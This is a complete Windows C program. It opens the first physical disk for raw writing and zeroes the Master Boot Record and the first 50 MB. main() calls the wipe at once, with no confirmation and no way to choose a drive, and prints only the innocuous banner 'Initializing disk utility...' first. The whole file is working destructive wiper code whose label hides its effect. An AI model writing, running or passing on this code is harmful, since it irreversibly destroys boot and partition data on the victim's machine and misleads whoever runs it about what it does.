#include <windows.h>
#include <stdio.h>

#define TARGET_DRIVE L"\\\\.\\PhysicalDrive0"
#define MBR_SIZE 512 // Standard MBR size is 512 bytes (Sector 0)
#define CHUNK_SIZE (1024 * 1024) // 1 MB chunks for efficient writing
#define TOTAL_WIPE_SIZE (50LL * 1024LL * 1024LL) // Total 50 MB

int WipeMBRThen50MB() {
    HANDLE hDrive = CreateFileW(
        TARGET_DRIVE,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        NULL
    );

    if (hDrive == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open drive handle. Error: %lu (Requires Elevation / Administrator)\n", GetLastError());
        return 0;
    }

    // Allocate an aligned memory buffer for raw disk operations
    LPVOID zeroBuffer = VirtualAlloc(NULL, CHUNK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!zeroBuffer) {
        printf("[-] Failed to allocate aligned buffer.\n");
        CloseHandle(hDrive);
        return 0;
    }
    ZeroMemory(zeroBuffer, CHUNK_SIZE);

    LARGE_INTEGER pos;

    // ==========================================
    // STEP 1: Wipe the MBR (First 512 bytes)
    // ==========================================
    pos.QuadPart = 0;
    if (!SetFilePointerEx(hDrive, pos, NULL, FILE_BEGIN)) {
        printf("[-] Failed to set file pointer to MBR. Error: %lu\n", GetLastError());
        VirtualFree(zeroBuffer, 0, MEM_RELEASE);
        CloseHandle(hDrive);
        return 0;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(hDrive, zeroBuffer, MBR_SIZE, &bytesWritten, NULL)) {
        printf("[-] Failed to overwrite MBR. Error: %lu\n", GetLastError());
        VirtualFree(zeroBuffer, 0, MEM_RELEASE);
        CloseHandle(hDrive);
        return 0;
    }
    printf("[+] Step 1 Complete: MBR (Sector 0) successfully wiped.\n");

    // ==========================================
    // STEP 2: Wipe the remaining area up to 50 MB
    // ==========================================
    printf("[+] Step 2 Starting: Wiping remaining data up to the 50 MB mark...\n");

    LONGLONG totalBytesWritten = MBR_SIZE; // We already wrote 512 bytes

    while (totalBytesWritten < TOTAL_WIPE_SIZE) {
        DWORD bytesToWrite = CHUNK_SIZE;
        if (totalBytesWritten + bytesToWrite > TOTAL_WIPE_SIZE) {
            bytesToWrite = (DWORD)(TOTAL_WIPE_SIZE - totalBytesWritten);
        }

        if (!WriteFile(hDrive, zeroBuffer, bytesToWrite, &bytesWritten, NULL)) {
            printf("[-] Write failed at offset %lld. Error: %lu\n", totalBytesWritten, GetLastError());
            break;
        }

        totalBytesWritten += bytesWritten;
        printf("[*] Progress: %lld MB / 50 MB written...\r", totalBytesWritten / (1024 * 1024));
    }

    printf("\n[+] Success: MBR and the first 50 MB have been wiped completely.\n");

    VirtualFree(zeroBuffer, 0, MEM_RELEASE);
    CloseHandle(hDrive);
    return 1;
}

int main() {
    printf("[!] Initializing disk utility...\n");
    WipeMBRThen50MB();
    
    printf("\nPress Enter to exit...");
    getchar();
    return 0;
}
